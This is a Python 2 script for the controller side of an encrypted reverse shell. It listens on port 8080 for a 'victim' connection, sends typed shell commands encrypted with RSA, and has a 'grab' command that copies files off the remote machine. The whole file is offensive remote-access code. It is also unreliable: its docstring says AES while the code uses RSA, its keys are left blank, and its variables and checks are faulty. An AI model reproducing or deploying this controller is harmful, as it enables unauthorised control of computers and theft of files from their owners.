"""
    AES is Symmetric Encryption which uses a same key for encryption and decryption
    on both sides.
"""
import socket
import os
from Crypto.PublicKey import RSA


def encrypt(message):
    # Here victim public key will be stored
    public_key =

    encryptor = RSA.importKey(public_key)
    global encryptdata
    encryptdata = encryptor.encrypt(message, 0) # it takes 2 arguments and returns
                                                # a tuple so we need arg 1 of it
    return encryptdata[0]
    
def decrypt(cipher):
    # here server private key will be stored
    private_key = 

    decryptor = RSA.importKey(private_key)
    decryptdata = decryptor.decrypt(cipher)
    return decryptdata

def transfer(conn, comm):
    conn.send(comm)
    f = open('/root/Desktop/test.png','wb')
    
    while True:
        bits = conn.recv(1024)       # grab the file in bits
        if 'Unable to find the file' in bits:
            print('[+] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print('[+] Transfer completed')
            f.close()
            break
        f.write(bits)
    f.close()
    
            

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("",8080))                       # binding the connection to the tunnel
    s.listen(1)                          # backlog value
    conn, addr = s.accept()
    print("[+] Got a connection from ", addr)

    while True:

        comm = raw_input("Shell> ")
        comm = encrypt(comm)

        if comm == "terminate":
            output = 'terminate'                      # terminate the connection
            #conn.send(output.encode('utf-8'))           # In python3 unicode characters can be send            
            conn.send(output)
            conn.close()
            break
        elif 'grab' in comm:                 # grab*fucker.exe
            transfer(conn,comm)
        else:
            #conn.send(comm.encode('utf-8'))          # encoding to utf-8 for python3
            conn.send(comm)
            result = conn.recv(512)
            if len(decrypt(result)) == 512:
                
                store = store + decrypt(result)  # get 1024 in two chunks
                result = conn.recv(512)
                store = store + decrypt(result)
            else:
                print decrypt(result)

        print store
                


def main():
    connect()


main()
